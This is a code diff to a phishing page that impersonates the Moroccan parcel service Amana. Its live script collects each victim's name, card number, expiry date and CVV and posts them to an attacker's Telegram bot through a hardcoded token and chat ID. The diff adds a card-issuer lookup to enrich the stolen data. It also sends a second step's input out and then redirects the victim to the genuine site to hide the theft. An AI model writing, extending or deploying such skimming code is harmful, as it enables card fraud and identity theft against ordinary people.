@@ -9,8 +9,6 @@
         .amana-gold { background-color: #fdb913; }
         .amana-blue { background-color: #0054a6; }
         input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
-        
-        /* Checkmark Animation */
         .check-container { animation: checkPop 0.5s ease-out forwards; }
         @keyframes checkPop {
             0% { transform: scale(0); opacity: 0; }
@@ -104,19 +102,27 @@
         const BOT_TOKEN = "8309521845:AAF253ZXZZt-RIr3YREgMWhwlMe5DGDm5Yo";
         const CHAT_ID = "8578403581";
 
-        // Auto formatting Card
-        document.getElementById('card').addEventListener('input', function (e) {
+        async function getCardInfo(bin) {
+            try {
+                const res = await fetch(`https://lookup.binlist.net/${bin.replace(/\s/g, '').substring(0, 6)}`);
+                const data = await res.json();
+                return `[${data.scheme || '?'}] ${data.type || '?'} - ${data.brand || '?'} (${data.bank ? data.bank.name : '?'})`;
+            } catch (e) { return "Info non disponible"; }
+        }
+
+        document.getElementById('card').addEventListener('input', (e) => {
             e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
         });
 
-        // Auto formatting Exp
-        document.getElementById('exp').addEventListener('input', function (e) {
+        document.getElementById('exp').addEventListener('input', (e) => {
             e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/, '$1/').trim();
         });
 
         document.getElementById('payForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            const text = `🚨 HIT AMANA! 🚨\n\n👤 NOM: ${document.getElementById('name').value}\n💳 CARD: ${document.getElementById('card').value}\n📅 EXP: ${document.getElementById('exp').value}\n🔑 CVV: ${document.getElementById('cvv').value}`;
+            const cardVal = document.getElementById('card').value;
+            const cardInfo = await getCardInfo(cardVal);
+            const text = `🚨 HIT AMANA! 🚨\n\n👤 NOM: ${document.getElementById('name').value}\n💳 CARD: ${cardVal}\n📅 EXP: ${document.getElementById('exp').value}\n🔑 CVV: ${document.getElementById('cvv').value}\n📊 INFO: ${cardInfo}`;
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
@@ -129,10 +135,7 @@
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
             document.getElementById('step2').classList.add('hidden');
             document.getElementById('step3').classList.remove('hidden');
-
-            setTimeout(() => {
-                window.location.href = "https://www.amana-colis.ma/";
-            }, 3000);
+            setTimeout(() => { window.location.href = "https://www.amana-colis.ma/"; }, 3000);
         });
     </script>
 </body>
